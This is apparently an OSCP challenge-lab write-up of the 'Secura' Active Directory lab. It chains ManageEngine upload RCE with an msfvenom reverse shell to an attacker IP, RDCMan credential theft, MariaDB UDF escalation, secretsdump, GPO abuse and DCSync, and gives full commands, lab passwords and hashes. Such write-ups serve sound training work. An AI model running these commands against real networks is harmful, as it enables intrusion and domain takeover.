---
title: Secura — Challenge Lab Writeup
date: 2026-10-18 20:30:00 +0800
categories: [OSCP, Challenges]
tags: [oscp, secura, active-directory, privilege-escalation, mariadb, udf, adscan, secretsdump, gpo]
description: >-
  Full walkthrough of the Secura (Challenge Lab 0) Active Directory environment —
  ManageEngine RCE, RDCMan credential theft, MariaDB UDF privilege escalation,
  credential dumping, GPO abuse, and full domain compromise via DCSync.
render_with_liquid: false
---

## 1.0 Scope & Objectives

This is a walkthrough of the **Secura** Active Directory lab. It is an *assumed breach* test — we are given one low-privileged domain account to start with, and our job is to work our way up to **full control of the Domain Controller** (Domain Admin).

| Item                    | Value                                  |
| ----------------------- | -------------------------------------- |
| Network range           | `192.168.216.0/24`                     |
| VM1 — Domain Controller | `192.168.216.97`                       |
| VM2 — workstation       | `192.168.216.96`                       |
| VM3 — workstation       | `192.168.216.95`                       |
| Starting account        | `Eric.Wallows` / `EricLikesRunning800` |

---

## 2.0 Attack Overview

The whole attack chains together a few separate weaknesses, one after another:

1. **Get a foothold.** A ManageEngine Applications Manager 14 web app runs on `192.168.216.95:8443`. It uses default credentials and has a file-upload feature that runs whatever you upload. We use it to get code execution as `SYSTEM` (CVE-2020-14008).
2. **Steal credentials.** The same machine holds RDCMan config files with passwords saved in plain text. We read them.
3. **Move sideways.** Those passwords let us log into the next machine (ERA).
4. **Escalate privileges.** On ERA, a MariaDB service runs as Administrator and its binary is writable. We abuse the MariaDB UDF feature to become Administrator.
5. **Own the domain.** The final step is full control of the Domain Controller.

---

## 3.0 Reconnaissance — Initial Network Enumeration

We ran a full TCP port scan with version detection against all three machines (total time 5m 32s):

```bash
nmap -p- -sC -sV -Pn -n 192.168.216.95 192.168.216.96 192.168.216.97
```

The full output is in the screenshots below; here is a short summary.

### 3.1 VM3 (192.168.216.95) — ManageEngine Application Server

This box has the usual Windows services open — SMB (135/139/445), RDP (3389) and WinRM (5985/5986). The interesting one is **HTTPS on port 8443**, which the scan identified as **ManageEngine Applications Manager**. There is also a Java RMI listener on port 49699.

### 3.2 VM2 (192.168.216.96) — MariaDB Database Host

This Windows box has SMB (135/139/445) and WinRM (5985/5986), plus a **MariaDB 10.3.24** database on port 3306.

### 3.3 VM1 (192.168.216.97) — Domain Controller

This is the **Domain Controller** for the `secura.yzx` domain, running Windows Server 2016 Standard. It runs the full set of Active Directory services: DNS (53), Kerberos (88), LDAP/LDAPS (389/636), SMB (445), kpasswd5 (464), Global Catalog (3268/3269) and ADWS (9389).

### 3.4 Evidence — Full Scan Output

![](/assets/img/posts/secura/recon-1.png)
![](/assets/img/posts/secura/recon-2.png)
![](/assets/img/posts/secura/recon-3.png)

---

## 4.0 Enumeration — ManageEngine Applications Manager

Section 3.1 found ManageEngine Applications Manager on port 8443. Now we dig into it.

### 4.1 Default Administrative Credentials

Opening `https://192.168.216.95:8443` shows the ManageEngine Applications Manager 14 login page. It still uses the **default credentials `admin:admin`** — nobody ever changed them.

![](/assets/img/posts/secura/manageengine-login.png)

### 4.2 Unrestricted File Upload (CVE-2020-14008)

Once logged in, we found a **file upload** feature. It accepts **any file type**, and it saves files into `C:\Program Files\ManageEngine\AppManager14\working\`. Anything placed in that folder gets **run by the server** — so uploading a payload there is a straight path to code execution. This is **CVE-2020-14008**, an unrestricted file-upload / RCE bug in ManageEngine.

![](/assets/img/posts/secura/manageengine-upload.png)

![](/assets/img/posts/secura/manageengine-enum.png)

![](/assets/img/posts/secura/manageengine-rce.png)

---

## 5.0 Exploitation — Initial Foothold on VM3

### 5.1 Remote Code Execution via File Upload

The upload feature from section 4.2 runs anything that lands in `working\`. To turn that into a shell, we built a Windows x64 reverse-shell payload with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=1234 -f exe -o 1.exe
```

![](/assets/img/posts/secura/msfvenom.png)

Then a small `run.bat` to launch it:

```bat
start "" "C:\Program Files\ManageEngine\AppManager14\working\1.exe"
```

![](/assets/img/posts/secura/run-bat.png)

We uploaded both files through the ManageEngine upload feature and triggered `run.bat`. On our side we started a Netcat listener:

```bash
nc -lvnp 1234
```

![](/assets/img/posts/secura/nc-listener.png)

The connection came back and gave us a shell on `192.168.216.95` running as **`NT AUTHORITY\SYSTEM`** — full local admin on VM3, no extra privesc needed.

### 5.2 Post-Exploitation Enumeration with Evil-WinRM & WinPEAS

For a stable, interactive shell, we logged in with Evil-WinRM using the given domain account:

```powershell
evil-winrm -i 192.168.216.95 -u Eric.Wallows -p 'EricLikesRunning800'
```

![](/assets/img/posts/secura/evilwinrm-shell.jpg)

We grabbed WinPEAS (from the PEASS-ng project):

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /home/kali/tools/winPEASx64.exe
```

Then uploaded and ran it in `windowscreds` mode (credential checks only, `quiet` hides the banner):

```powershell
upload /home/kali/tools/winPEASx64.exe
./winpeasx64.exe windowscreds quiet > winpeas.txt
download winpeas.txt
```

![](/assets/img/posts/secura/winpeas-upload.png)

![](/assets/img/posts/secura/winpeas-download.jpg)

WinPEAS pointed us to a few useful things:

- **RDCMan settings file** — `C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings`. RDCMan saves RDP connection passwords, so this file is a lead.
- **A saved RDP connection** to `era.secura.local` (Administrator, SID `500`).
- **DPAPI files** — encrypted credential blobs under the Administrator profile.

---

## 6.0 Lateral Movement & Pivoting

### 6.1 RDCMan Stored Credentials (lead)

WinPEAS found an RDCMan settings file. RDCMan stores RDP connection credentials, so we opened the file:

![](/assets/img/posts/secura/winpeas-rdcman.png)

Inside was a password stored in **plain text**:

| Field    | Value         |
| -------- | ------------- |
| Username | `apache`      |
| Password | `New2Era4.!`  |
| Domain   | `SECURE`      |

The saved connection points to `era.secura.yzx` — the next machine. RDCMan keeps these passwords in cleartext, so anyone with local admin on the host can read them.

Excerpt from `RDCMan.settings`:

```xml
<credentialsProfile inherit="None">
  <profileName scope="Local">SECURE\apache</profileName>
  <userName>apache</userName>
  <password>New2Era4.!</password>
  <domain>SECURE</domain>
</credentialsProfile>
<server>Connect To\era.secura.yzx</server>
```

### 6.2 Lateral Movement — the `apache` credential

We used the `apache` password to log into `192.168.216.96` (hostname `era`) over WinRM:

```bash
evil-winrm -i 192.168.216.96 -u apache -p 'New2Era4.!'
```

WinRM (port 5985) is a remote management service, and Evil-WinRM turns it into a PowerShell shell. We got a shell as the local user **`era\apache`** — a low-privileged local account.

![](/assets/img/posts/secura/apache-shell.jpg)

---

## 7.0 Privilege Escalation on ERA — MariaDB UDF

### 7.1 Enumeration with PrivescCheck

Now we are `era\apache` — a normal, low-level user. We need to find a way to run code as a more powerful account. Two tools help with that: **WinPEAS** and **PrivescCheck**.

```powershell
upload /home/kali/tools/PrivescCheck.ps1
Get-Content .\PrivescCheck.ps1 -Raw | Invoke-Expression; Invoke-PrivescCheck -Extended
```

*(PrivescCheck comes from `https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1`.)*

The most important thing it found was about a service called **MySQL** — explained below.

### 7.2 The Finding — MySQL Service Runs as Administrator

A Windows service is a program that runs quietly in the background. Each service runs as a specific account — sometimes a normal user, sometimes SYSTEM or Administrator.

If a service runs as Administrator, **and** a normal user can edit its program file, then that user can swap the file for their own. When the service runs, it launches their file — with Administrator's power.

PrivescCheck found two services whose program files we could edit:

| Service        | Program file                    | Runs as           | Useful?                  |
| -------------- | ------------------------------- | ----------------- | ------------------------ |
| `ApacheServer` | `C:\xampp\apache\bin\httpd.exe` | `.\apache`        | No — already our user    |
| `MySQL`        | `C:\xampp\mysql\bin\mysqld.exe` | `.\Administrator` | **Yes**                  |

`ApacheServer` is useless — it already runs as `apache`, our own user. `MySQL` is the target: its program runs as **Administrator**, and we can write to it.

We tried swapping the file, but it was locked (the service was running):

```powershell
copy .\mysqld.exe C:\xampp\mysql\bin\mysqld.exe
# The process cannot access the file ... it is being used by another process.
```

We also couldn't restart the service (`net stop MySQL` → access denied) or reboot (`shutdown /r` → access denied over WinRM). So we took a different route — the database itself.

### 7.3 The Pivot — MariaDB User-Defined Function (UDF)

The database program (`mysqld.exe`) already runs as Administrator. So if we can make the database run a command for us, that command runs as Administrator.

MariaDB has a feature for this: **UDF (User-Defined Function)**. The idea is simple — we install a small plugin (a `.dll` file) that teaches the database a new function called `sys_eval`. Then calling `sys_eval('whoami')` makes the database run `whoami` and give us the result.

Five things had to line up — and they all did here:

1. **Admin access to the database.** We connected as `root` with no password (XAMPP's default, never changed).
2. **The database can write files.** `secure_file_priv` was empty, so it can write anywhere.
3. **Find the plugin folder.** `plugin_dir` told us where the `.dll` must go.
4. **Get the plugin.** We used `lib_mysqludf_sys.dll` from sqlmap. It's stored "cloaked" (encrypted), so we uncloaked it first:

```bash
python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
```

5. **Put the `.dll` in place and register it.** The plugin folder didn't exist yet, so we created it, copied the file in, and registered the function:

```powershell
mkdir C:\xampp\mysql\lib\plugin
upload /home/kali/oscp/secura/lib_mysqludf_sys.dll
copy .\lib_mysqludf_sys.dll C:\xampp\mysql\lib\plugin\lib_mysqludf_sys.dll
C:\xampp\mysql\bin\mysql.exe -u root -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';"
```

That last line registers `sys_eval` as a SQL function. It's ready to use.

**Further reading.**

- MariaDB — [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and [User-Defined Functions](https://mariadb.com/docs/server/server-usage/user-defined-functions).
- MariaDB — [User-Defined Functions Security](https://mariadb.com/docs/server/server-usage/user-defined-functions/user-defined-functions-security).
- HackTricks — [MySQL / MariaDB Privilege Escalation (UDF)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql/index.html).
- `lib_mysqludf_sys` — [project page](https://github.com/mysqludf/lib_mysqludf_sys).
- sqlmap — [UDF files + `cloak.py`](https://github.com/sqlmapproject/sqlmap).
- MySQL UDF Exploitation cheat sheet — [koparmalbaris/MySQL-UDF-Exploitation](https://github.com/koparmalbaris/MySQL-UDF-Exploitation).
- HackIndex — [MySQL UDF Privilege Escalation](https://hackindex.io/services/mysql/exploitation/mysql-udf-privilege-escalation).

### 7.4 Executing Commands as Administrator

Now we just call `sys_eval` from SQL. It runs inside `mysqld.exe`, which is Administrator:

```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT sys_eval('whoami');"
```

```
sys_eval('whoami')
era\administrator
```

`era\administrator` — we went from `apache` to **Administrator**.

---

## 8.0 Credential Dumping with secretsdump

Now that we are Administrator on ERA, the next goal is to collect credentials that get us to the Domain Controller. Windows stores secrets in a few places:

- **SAM** — hashes of local accounts (like Administrator).
- **LSA Secrets** — passwords of services that run as a specific account, stored in a recoverable form.

We can't read these files while Windows is running (they're locked), so we saved copies of the registry hives and parsed them offline:

We saved the `SAM`, `SYSTEM` and `SECURITY` hives and parsed them offline:

```powershell
reg save HKLM\SAM C:\Users\apache.ERA\Documents\sam.hiv
reg save HKLM\SYSTEM C:\Users\apache.ERA\Documents\system.hiv
reg save HKLM\SECURITY C:\Users\apache.ERA\Documents\security.hiv
```

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

`SYSTEM` holds the boot key that decrypts the other two hives — that is why we saved all three together.

Two useful things came out:

- **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret (MySQL runs as Administrator, so its password is stored in a readable form).
- **The Administrator NTLM hash** — `faf613cedb73980bbd34e0a5514df813`.

```
[*] _SC_MySQL
(Unknown User):Almost4There8.?
```

No cached domain logins on ERA, so this machine alone does not reach the domain — we need a domain account.

---

## 9.0 Domain Compromise

### 9.1 charlotte's Credentials — from the MySQL creds table

The credential dump in section 8.0 gave us local administrator credentials, but no path into the domain. We still had MySQL root access on ERA (from the UDF escalation in section 7.0), so we looked there and found a database called `creds` that does not exist in a standard XAMPP install:

```powershell
C:\xampp\mysql\bin\mysql.exe -u root -e "SHOW DATABASES;"
C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT * FROM creds.creds;"
```

It held a single table with two plaintext passwords:

```
name          pass
administrator Almost4There8.?
charlotte     Game2On4.!
```

A custom database named `creds` is a strong signal — it looks like a home-grown place to store passwords, which applications should never do.

The `administrator` entry matched the password we had already recovered from LSA in section 8.0. The `charlotte` entry was new — a domain user's password. That is our ticket into the domain: with a valid domain account we can now talk to the Domain Controller directly.

### 9.2 GPO Abuse — charlotte to Domain Admins

We tested charlotte's password against the Domain Controller and got a valid WinRM session:

```bash
nxc smb 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
nxc winrm 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
```

A first DCSync attempt as charlotte failed (she held only partial replication rights):

```bash
impacket-secretsdump secura.yzx/charlotte:'Game2On4.!'@192.168.216.97
```

```
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN
```

charlotte is a normal domain user, not an admin. But there is a path to Domain Admin here — Group Policy abuse.

A **GPO (Group Policy Object)** is a set of settings that the Domain Controller pushes out to computers and users. For example, a GPO can say "run this scheduled task at logon" for every machine in the domain. If a GPO holds a scheduled task, that task runs as **SYSTEM** on the machines that apply it — including the Domain Controller.

charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`). WriteOwner means she can change who owns the GPO — and whoever owns it can edit its contents. That is the gap we abuse.

We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy. The task runs one command: add charlotte to the Domain Admins group.

```bash
python3 pygpoabuse.py secura.yzx/charlotte:'Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" charlotte /add /domain' -dc-ip 192.168.216.97
```

We then forced the policy to apply straight away (normally Group Policy refreshes on a timer, but we don't want to wait):

```powershell
gpupdate /force
```

The scheduled task ran as SYSTEM on the Domain Controller and added charlotte to the Domain Admins group.

### 9.3 DCSync — Full Domain Compromise

charlotte is now a Domain Admin. That unlocks **DCSync**.

DCSync is a technique that asks the Domain Controller to send us its password database (the NTDS.dit secrets). It normally only works for Domain Controllers and Domain Admins, because it needs a special right — "Replicate Directory Changes". charlotte's first attempt failed earlier because she did not have that right. Now, as a Domain Admin, she does:

```bash
impacket-secretsdump secura.yzx/charlotte:'Game2On4.!'@192.168.216.97
```

The dump gave us every account hash in the domain, including the two most valuable ones:

```
Administrator : d38e7c66048f80fd9566ab85afca76b1
krbtgt        : 431f60ffa71152f8445bea272663d7c3
```

- **Administrator** hash lets us log in anywhere as the domain's top account (pass-the-hash).
- **krbtgt** is the Kerberos master key. Whoever holds it can forge golden tickets — self-signed Kerberos tickets that give persistent Domain Admin access, even if every password is changed.

With both hashes, we have full and lasting control of `secura.yzx`. Domain compromise is complete.

---

## 10.0 Flags

We collected five flags — one `proof.txt` per machine, plus `local.txt` on the two machines where we held a user foothold.

- `local.txt` sits on the Desktop of the first foothold user (`apache` on ERA, `charlotte` on DC01).
- `proof.txt` sits on the Desktop of the local Administrator (`Administrator.DC01` on the DC).

SECURE (.95) has no `local.txt` — we jumped straight to SYSTEM through the ManageEngine upload, so there was no user foothold to capture.

We used `nxc` to find them: list the Desktop, search recursively, then read the file.

```bash
# list Administrator Desktop
nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'dir C:\Users\Administrator\Desktop\'

# search local.txt / root.txt recursively
nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'where /r C:\Users local.txt root.txt'

# read a flag
nxc smb <IP> -u <user> -H <hash> [--local-auth] -x 'type C:\Users\<user>\Desktop\<flag>'
```

One gotcha: ERA’s Administrator is a **local** account, so we had to add `--local-auth`. SECURE and the DC use domain accounts.

| Machine | Flag | Path | Value |
|---|---|---|---|
| SECURE (.95) | proof.txt | `C:\Users\Administrator\Desktop\proof.txt` | `ee73679ebe21b05ed7ffd49ef47b8574` |
| ERA (.96) | local.txt | `C:\Users\apache\Desktop\local.txt` | `4d4a472223937f42204fddf7b4bc1f4b` |
| ERA (.96) | proof.txt | `C:\Users\Administrator\Desktop\proof.txt` | `5f01668ca7c20176d7578d8b58cfaaf2` |
| DC01 (.97) | local.txt | `C:\Users\charlotte\Desktop\local.txt` | `d1b77d0baa79cc2722b9f10bfb513dc2` |
| DC01 (.97) | proof.txt | `C:\Users\Administrator.DC01\Desktop\proof.txt` | `4903e006054592d4c58f6550c41d8741` |
